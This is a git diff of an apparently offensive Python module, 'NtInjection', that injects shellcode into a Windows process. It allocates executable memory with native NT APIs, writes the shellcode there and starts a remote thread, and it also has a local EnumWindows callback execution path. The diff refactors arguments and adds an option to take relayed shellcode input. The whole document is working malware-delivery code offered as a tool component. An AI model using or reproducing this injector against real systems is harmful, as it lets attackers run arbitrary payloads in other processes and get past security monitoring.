@@ -1,3 +1,9 @@
+########################################################
+### NtInjection Module
+### Status: migrated to 081
+### Passed: (x) manual tests (x) task
+########################################################
+
 import os
 #import ctypes
 from utils.windef import *
@@ -14,10 +20,10 @@ def register_arguments(parser):
 
             grp = parser.add_argument_group('additional')
             # grp.add_argument('-r', '--resume-thread', action='store_true', help='Start thread suspended and resume after speciefied time')
-            grp.add_argument('-s', '--start', action='store_true', help='If not active, start the process before injection')
+            grp.add_argument('-s', '--start-process', action='store_true', help='If not active, start the process before injection')
             # grp.add_argument('-v', '--virtual-protect', action='store_true', help='Deny access on memory for a specified time')
 
-class inject:
+class module:
     #from ctypes import windll
     #from ctypes import wintypes
     from urllib import request
@@ -27,7 +33,7 @@ class inject:
 
     Author = 'psycore8'
     Description = 'native inject shellcode to process'
-    Version = '0.0.1'
+    Version = '0.0.3'
     DisplayName = 'NATIVE-INJECTION'
     delay = 5
     data_size = 0
@@ -35,12 +41,13 @@ class inject:
     pid = int
     nt_error = 0
     callback_func = False
+    shellcode = b''
+    relay_input = False
 
-    def __init__(self, input_file, process_start, target_process, shellcode, resume_thread=None, virtual_protect=None):
-        self.input_file = input_file
-        self.process_start = process_start
-        self.target_process = target_process
-        self.shellcode = shellcode
+    def __init__(self, input, start_process, process):
+        self.input_file = input
+        self.process_start = start_process
+        self.target_process = process
         # self.resume_thread = resume_thread
         # self.virtual_protect = virtual_protect
 
@@ -84,10 +91,8 @@ class inject:
 
     def start_injection(self):
         if self.callback_func:
-            #mem = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
             mem = VirtualAlloc(0, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
             print(f'0x{mem:X}')
-            #wpm = WriteProcessMemory(phandle, mem, self.shellcode, len(self.shellcode), 0)
             RtlMoveMemory(mem, self.shellcode, len(self.shellcode))
             try:
                 pEnumWindows(mem, 0)
@@ -107,7 +112,6 @@ class inject:
         if phandle:
             self.msg('inj.handle')
 
-        #memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         rs = SIZE_T(len(self.shellcode))
         rs_ptr = ctypes.byref(rs)
         memory = pNtAllocateVirtualMemory(phandle, ctypes.byref(base_address), 0, rs_ptr, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
@@ -117,8 +121,6 @@ class inject:
             self.nt_error = memory
             self.msg('error.alloc')
 
-        #c_null = ctypes.c_int(0)
-        #writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0) ##ctypes.byref(c_null))
         bs = len(self.shellcode)
         writing = pNtWriteVirtualMemory(phandle, base_address, self.shellcode, bs, None)
         if writing == NT_SUCCESS:
@@ -126,18 +128,8 @@ class inject:
         else:
             self.nt_error = memory
             self.msg('error.write')
-        # if self.virtual_protect:
-        #     self.msg('inj.nacc')
-        #     VirtualProtectEx(phandle, None, 0, 0x01, None)
-
-        # if self.resume_thread or self.virtual_protect:
-        #     self.msg('inj.susp')
-        #     Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
-        # elif self.ntcrt:
         th = HANDLE()
         Injection = pNtCreateThreadEx(ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, base_address, None, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, None)
-        # else:
-        #     Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)
 
         if Injection == NT_SUCCESS :
             self.msg('inj.inj_ok')
@@ -173,21 +165,26 @@ class inject:
         return False
     
     def open_file(self):
-        try:
-            with open(self.input_file, 'rb') as file:
-                self.shellcode = file.read()
-        except FileNotFoundError:
-            return False
+        if self.relay_input:
+            self.shellcode = bytes(self.input_file)
+        else:
+            try:
+                with open(self.input_file, 'rb') as file:
+                    self.shellcode = file.read()
+            except FileNotFoundError:
+                return False
     
     def process(self):
         self.msg('pre.head')
-        self.msg('proc.input_try')
-        if CheckFile(self.input_file):
-            self.data_size, self.hash = GetFileInfo(self.input_file)
-            self.msg('proc.input_ok')
-            self.open_file()
-            self.msg('proc.try')
-            self.start_injection()
-        else:
-            self.msg('error.input', True)
+        if not self.relay_input:
+            self.msg('proc.input_try')
+            if CheckFile(self.input_file):
+                self.data_size, self.hash = GetFileInfo(self.input_file)
+                self.msg('proc.input_ok')
+            else:
+                self.msg('error.input', True)
+        self.open_file()
+        self.msg('proc.try')
+        self.start_injection()
+
         self.msg('post.done')
